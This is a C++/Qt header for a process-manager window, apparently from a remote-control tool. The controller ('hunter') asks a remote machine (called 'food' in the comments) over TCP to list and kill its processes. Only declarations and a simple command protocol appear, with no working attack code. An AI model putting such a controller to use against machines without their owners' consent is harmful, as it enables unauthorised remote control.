#ifndef PROC_H
#define PROC_H

#include <QWidget>
#include <QTableWidget>
#include "tcpserver.h"
#include "tcpsocket.h"
#include <QMenu>
#include <QMessageBox>
#include <QTextCodec>
#include <QApplication>
#include <QDesktopWidget>
#include <QHeaderView>

class Proc : public QWidget
{
    Q_OBJECT

public:
    explicit Proc(QWidget *parent = nullptr);

    // 开始进程管理服务器，然后返回新的端口号
    int startProcServer(QString userName);

private:
    // 显示进程信息
    QTableWidget *mtableProc;
    QMenu *mProcMenu;
    TcpServer *mServer;
    TcpSocket *mSock;
    QString _userName;

    // 用于解码GBK
    QTextCodec *codec = QTextCodec::codecForName("GBK");

    // hunter发送至食物
    const QByteArray CmdFreshProcs = "FRESH_PROCS";
    const QByteArray CmdKillProc = "KILL_PROC";
    // 食物发送至hunter
    const QByteArray CmdSendProc = "SEND_PROC";
    const QByteArray CmdKillProcSuccess = "KILL_SUCCESS";
    const QByteArray CmdKillProcFailed = "KILL_FAILED";
    // 分割与结束符
    const QByteArray CmdSplit = ";";
    const QByteArray CmdEnd = "\r\n";

    // 处理指令
    void processCommand(QByteArray &cmd, QByteArray &args);
    // 分解指令的参数，反回哈希表
    QHash<QByteArray, QByteArray> parseArgs(QByteArray &args);

    // 处理指令具体函数
    void doFreshProcs(QHash<QByteArray, QByteArray> &args);
    void doAddProc(QHash<QByteArray, QByteArray> &args);

signals:

public slots:
    // 添加进程到列表
    void addProcToTbl(int pid, QString exeName, QString owner, QString command);
    // 杀死进程
    void killProc();
    // 刷新进程列表
    void refreshProcTbl();
    // 返回当前选中进程pid
    int curProcPidInTbl();
    // 有新客户连接
    void newConnection(QTcpSocket *s);
    // 处理新数据
    void processBuffer();

protected:
    // 事件过滤，主要用来截取弹出菜单事件
    bool eventFilter(QObject *watched, QEvent *event);
    // 大小重置
    void resizeEvent(QResizeEvent *);
    // 关闭
    void closeEvent(QCloseEvent *);

};

#endif // PROC_H
